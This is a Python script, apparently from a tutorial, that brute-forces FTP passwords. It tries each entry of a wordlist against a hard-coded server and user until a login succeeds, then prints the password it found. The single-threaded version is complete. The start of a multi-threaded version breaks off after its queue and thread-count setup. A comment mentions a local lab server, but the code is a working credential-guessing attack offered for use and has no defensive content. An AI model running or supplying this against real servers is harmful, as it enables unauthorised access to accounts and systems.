# pip3 install colorama
# set up an FTP server in local network on a machine that runs on Linux

import ftplib
from colorama import Fore, init # for fancy colors, nothing else

# hostname or IP address of the FTP server
host = "192.168.1.113"
# username of the FTP server, root as default for linux
user = "test"
# port of FTP, aka 21
port = 21

def is_correct(password):
    # initialize the FTP server object
    server = ftplib.FTP()
    print(f"[!] Trying", password)

    try:
        # tries to connect to FTP server with a timeout of 5
        server.connect(host, port, timeout=5)
        # login using the credentials (user & password)
        server.login(user, password)
    except ftplib.error_perm:
        # login failed, wrong credentials
        return False

    else:
        # correct credentials
        print(f"{Fore.GREEN}[+] Found credentials:", password, Fore.RESET)
        return True

# read the wordlist of passwords
passwords = open("wordlist.txt").read().split("\n")
print("[+] Passwords to try:", len(passwords))

# iterate over passwords one by one
# if the password is found, break out of the loop
for password in passwords:
    if is_correct(password):
        break

#this code is okey, but it is very slow,
#it uses only one thread that attempts an FTP connection on each password sequentially.

#Let's use threads to accelerate this process,
#the following code is the complete one that uses multi-threading:

import ftplib
from threading import Thread
import queue
from colorama import Fore, init # for fancy colors, nothing else

# init the console for colors (for Windows)
# init()
# initialize the queue
q = queue.Queue()
# number of threads to spawn
n_threads = 30
